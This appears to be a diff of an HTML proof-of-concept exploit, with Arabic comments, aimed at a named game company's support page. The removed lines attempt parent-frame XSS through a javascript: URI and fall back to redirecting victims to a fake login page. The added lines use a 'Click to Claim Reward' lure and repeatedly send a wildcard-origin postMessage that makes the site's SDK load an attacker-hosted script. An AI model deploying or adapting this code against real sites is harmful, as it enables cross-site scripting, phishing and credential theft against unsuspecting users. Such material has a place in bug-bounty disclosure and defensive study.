@@ -1,21 +1,30 @@
-https://github.com/hackfoxy26-ops/xss/tree/main<!DOCTYPE html>
+<!DOCTYPE html>
 <html>
-<head>
-    <title>SDK Hijack PoC</title>
-</head>
 <body>
+    <h1>InnoGames PoC - Maryout</h1>
+    <button onclick="startExploit()">Click to Claim Reward</button>
+
     <script>
-        console.log("Malicious SDK Iframe Loaded!");
-        // محاولة تنفيذ XSS على الصفحة الأم (Parent)
-        try {
-            // بنجرب نغير الـ location بتاع الـ parent لـ javascript URI
-            window.parent.location = "javascript:alert('XSS_BY_MARYOUT_DOM_HIJACKING_DOMAIN_'+document.domain)";
-        } catch(e) {
-            console.log("XSS Blocked by Browser/CSP, falling back to Phishing.");
-            // لو الـ alert اتقفلت، حول الصفحة كلها لموقعك الخبيث
-            window.parent.location = "https://evil.com/fake-login"; 
+        function startExploit() {
+            // 1. افتح الصفحة
+            var win = window.open("https://support.innogames.com/playerticket", "poc");
+
+            // 2. دالة لإرسال الرسالة بشكل متكرر لضمان وصولها أول ما الـ SDK يفتح
+            var attempts = 0;
+            var interval = setInterval(function() {
+                attempts++;
+                console.log("Attempting to poison... " + attempts);
+                
+                win.postMessage({
+                    action: "theymes.openExternalPage",
+                    url: "https://support.innogames.com/playerticket", // ريفريش
+                    path: "@raw.githack.com/hackfoxy26-ops/xss/main/xss.html",
+                    target: "_self"
+                }, "*");
+
+                if (attempts > 10) clearInterval(interval); // جرب 10 مرات
+            }, 2000); // كل ثانيتين ابعت رسالة
         }
     </script>
-    <h2>Attacker Controlled Iframe</h2>
 </body>
 </html>
